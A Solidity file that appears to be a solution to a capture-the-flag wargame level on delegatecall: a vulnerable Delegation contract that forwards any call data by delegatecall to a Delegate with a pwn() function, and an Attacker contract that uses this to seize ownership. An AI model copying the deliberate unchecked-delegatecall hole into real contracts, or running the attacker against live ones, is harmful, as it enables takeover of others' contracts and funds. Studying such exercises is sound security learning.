// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

//after creating the Attacker contract and calling the attack() function with the right amount of gas ~300000
//call the fallback function with the variable signature from the Attacker contract. Then it's done.
  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

contract Attacker {

    Delegation delegation;
    bytes public signature = abi.encodeWithSignature("pwn()");

//create this contract usging the delegation address
    constructor (address _delegation) {
        delegation = Delegation(_delegation);
    }

//call the attack function with the right amount of gas ~300000
    function attack() public {
        address(delegation).call(abi.encodeWithSignature("pwn()"));
    }
}
